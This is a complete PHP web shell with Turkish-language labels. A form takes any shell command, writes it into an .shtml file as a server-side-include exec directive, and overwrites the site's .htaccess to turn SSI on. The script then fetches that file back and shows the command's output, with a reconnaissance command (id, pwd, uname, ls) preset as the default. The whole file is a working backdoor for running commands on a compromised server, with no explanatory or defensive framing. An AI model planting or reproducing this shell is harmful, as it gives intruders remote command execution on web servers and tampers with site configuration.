<?php

$z=$_SERVER['SCRIPT_NAME'];
$f=explode("/",$z);
$biyo=str_replace(end($f),'',$z);
$son=str_replace("http://$_SERVER[HTTP_HOST]","",$biyo);
$path=$son."ogi.shtml";
$host=$_SERVER['HTTP_HOST'];

function temizle($kod){
if(get_magic_quotes_gpc()) {
        $kod=stripslashes($kod);
    }
return htmlentities($kod, ENT_QUOTES);
}

function tem($kod){
if(get_magic_quotes_gpc()) {
        $kod=stripslashes($kod);
    }else{
    	$kod=$kod;
    }
return $kod;
}

function get($host,$path){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$host.$path);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$veri = curl_exec ($ch);
curl_close ($ch);
if($veri){
	return $veri;
}else{
	die("icerigi alamadim");
}
}

function kaydet($yaz){
	$yaz='biyocmd <!--#exec cmd="'.$yaz.'" --> biyocmd';
	$ac=fopen("ogi.shtml","w+") or die("Dizin yazilabilinir degil");
	fwrite($ac,$yaz);
	fclose($ac);
	$ht='Options +Includes
AddType text/html .shtml
AddHandler server-parsed .shtml';
	$dosya=fopen(".htaccess","w+") or die("Htaccess dosyasina erisim yok");
	fwrite($dosya,$ht);
	fclose($dosya);

}



?><html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>

</head>
<body>
<form method="post" action="">
<input name="liz0" type="text" value="<?php 
if(isset($_POST['liz0'])) {
echo  temizle($_POST['liz0']); 
	
}else {
  echo 'id;pwd;uname -a;ls -la';
	
} ?>">
<input type="submit" value="calistir">
</form>
<?php
if(isset($_POST['liz0'])){

$kod=tem($_POST['liz0']);
kaydet($kod);
$desen="|biyocmd (.*) biyocmd|siU";
preg_match($desen,get($host,$path),$cik);
if($cik['1']){
echo "<h2>Command Result:</h2>";
echo "<pre><b>".htmlentities($cik['1'], ENT_QUOTES)."</b></pre>";
}
else{
die("uzgunum_evlat..");
}

}

?>
</body>
</html>
